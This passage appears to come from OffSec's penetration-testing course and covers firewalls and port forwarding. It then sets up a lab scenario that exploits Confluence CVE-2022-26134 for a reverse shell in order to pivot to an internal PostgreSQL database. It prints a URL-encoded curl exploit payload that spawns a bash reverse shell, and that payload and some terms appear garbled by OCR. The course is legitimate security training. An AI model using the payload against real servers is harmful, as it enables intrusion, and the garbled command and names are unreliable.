
# OffSec

Penetration Testing with Kali Linux

network infrastructure. Administrators may even place a standalone hardware firewall in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially-malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block hosts or subnets from accessing the wider internet.

Most firewalls tend to allow or block traffic in a set of rules based on IP addresses and port numbers, so their functionality is limited. however sometimes fine-grained control is required. Deep Packet Inspection⁸⁰ monitors the contents of incoming and outgoing traffic and terminates it on a base of rules.

Boundaries that are put in place by network administrators are designed to prevent the arbitrary movement of data, out of and across the network. But, as an attacker, these are exactly the boundaries we must traverse. We will need to develop strategies that can help us work around network restrictions as we find them.

Port redirection (a term we are using for various types of port forwarding⁸¹ and tunneling⁸²) are both strategies we can use to traverse these boundaries. Port redirection modifying the flow of data so that packets sent to one socket will be taken and passed to another socket. Tunneling encapsulates⁸³ one type of data stream within another, for example, transporting Hyper Transfer Protocol (HTTP) traffic within a Secure Shell (SSH) connection (so from an external perspective, only the SSH traffic will be visible.

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll be easy by starting with the lowest-complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different from the previous. The only tunneling we cover in this particular Module is SSH tunneling, but we will cover advanced methods in a later Module.

The logical topologies⁸⁴ we create while chaining these strategies may be difficult to digest at first. We will be making traffic in ways that may not be intuitively obvious. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we will have all the tools required to manage the flow of traffic in any network with surgical precision.

# 18.2 Port Forwarding with Linux Tools

This Unit covers the following Learning Objectives:

- 1. Understand what port forwarding is
- 2. Learn when to use port forwarding techniques

> ⁸⁰ (Wikipedia, 2022), https://en.wikipedia.org/wiki/Deep_packet_inspection
⁸¹ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Port_forwarding
⁸² (Wikipedia, 2019), https://en.wikipedia.org/wiki/Tunneling_protocol
⁸³ (Wikipedia, 2022), https://en.wikipedia.org/wiki/Encapsulation_(networking)
⁸⁴ (Wikipedia, 2022), https://en.wikipedia.org/wiki/Network_topology

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# 3. Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface, and pass all packets to the web server behind it.

Many routers also provide port forwarding functionality. This can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

But how might we use port forwarding as part of an attack chain? In the next section, we'll consider a simple scenario.

# 18.2. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux server running a version of Confluence⁸⁸⁵ vulnerable to CVE-2022-26134⁸⁸⁶ a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two network interfaces: one attached to the same network as our Kali machine is also (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we find credentials and the IP address and port for a PostgreSQL⁸⁸⁷ database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The diagram below shows the network layout, as we understand it so far.

![](img/336d6ea891e7464f18ad64426619ced4_564_0.png)

> ⁸⁸⁵ (Atlassian, 2022), https://www.atlassian.com/software/confluence
⁸⁸⁶ (Atlassian, 2022), https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-11303771746.html
⁸⁸⁷ (PostgreSQL, 2022), https://www.postgresql.org/

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# Figure 24: The network layout from our perspective so far

One of the first things to notice about this diagram is there two named networks: the Wide Area Network (WAN) on the left and the Demilitarized Zone (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server is in the DMZ, and the Confluence server straddles both.

WAN is a network that is large expanse. Some organizations will refer to their internal network as WAN or the internet itself. In this case, since we're simulating an attack from an external network, the WAN represents the corporate network. Throughout the exercises, our Kali machine will be situated in the WAN. We will be able to route directly from our Kali machine to hosts that are also on the WAN.

DMZ is a network containing devices that may be more exposed to a wider, less trusted network. DMZ helps create a buffer zone between internal hosts. In this way, it serves a similar function to a real-world Demilitarized zone. In this scenario, the DMZ is the buffer segment between the WAN and whatever other network we may find. Confluence is straddling both WAN and DMZ to illustrate that it is able to communicate on both networks. Confluence is also listening on TCP port 8090, illustrated by the "open socket" attached to it. PostgreSQL is within the DMZ boundary - it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we cannot route directly to PostgreSQL. PostgreSQL also has an "open socket" attached to it, illustrating that something is listening on TCP port 5432 (this is likely a PostgreSQL server). The only thing we know about PostgreSQL so far is it exists, we don't know if it's attached to any other networks. If later we find PostgreSQL is attached to other networks, we will expand our diagram. With the credentials found on Confluence, we want to connect to this PostgreSQL from our Kali machine. Before getting into more detail, let's set up our lab environment to recreate the scenario so far.

- ⁸⁸⁸ (Wikipedia, 2022), https://en.wikipedia.org/wiki/Wide_area_network
- ⁸⁸⁹ (Wikipedia, 2022), https://en.wikipedia.org/wiki/DMZ_(computing)
- ⁸⁰ (Wikipedia, 2022), https://en.wikipedia.org/wiki/Demilitarized_zone

At the end of Port Forwarding Socat of this Learning Unit, a group of VMs are provided to be used along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques covered. You can start the VM group at any point and follow whatever pace feels comfortable.

# 18.2.2 Setting Up The Environment

To gain access to Confluence, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we find a blog post from Rapid⁸⁹¹ that includes a cURL⁸⁹² command containing a proof-of-concept⁸⁹³ payload claims to exploit the vulnerability and return a reverse shell.

```bash
curl \
http://10.0.0.28:8090/?%28New%29javascript.ScriptEngineManager%28%29.getRuntimeByName%28%22nashorn%22%29).exec(%22%27java.lang.ProcessBuilder%28%29.command(%22%27C%27%27bash%2Cn%27%2Fdev%2Ftmp%2Fexploit%2C%27%27%28start%28%29%27%28%29%22%29%29%7D
```

Listing 518 - The example payload from Rapid⁸⁹¹ blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (-v) curl request is being made to http://10.0.0.28:8090, which we assume is the blog author's vulnerable Confluence server. We observe that many of the characters in it are URL-encoded⁸⁹⁵ so we need to decode them to get a clearer sense of what the payload actually does.

You can quickly decode strings using Decoding As... > URL in the Decoder tab, or using an online tool like CyberChef⁸⁹⁷. If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that is publicly aware, so we can use online tools if necessary.

After decoding the payload, the function of the payload is.

> ⁸⁹¹ (Rapid, 2022), https://www.rapid.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
⁸⁹² (cURL, 2022), https://curl.se/
⁸⁹³ (Wikipedia, 2022), https://en.wikipedia.org/wiki/Proof_of_concept
⁸⁹⁴ (Wikipedia, 2022), https://en.wikipedia.org/wiki/Uniform_Resource_Identifier_Syntax
⁸⁹⁵ (Wikipedia, 2022), https://en.wikipedia.org/wiki/Percent-encoding
⁸⁹⁶ (PortSwigger, 2022), https://portswigger.net/bur
⁸⁹⁷ (GCHQ, 2022), https://gchq.github.io/CyberChef/
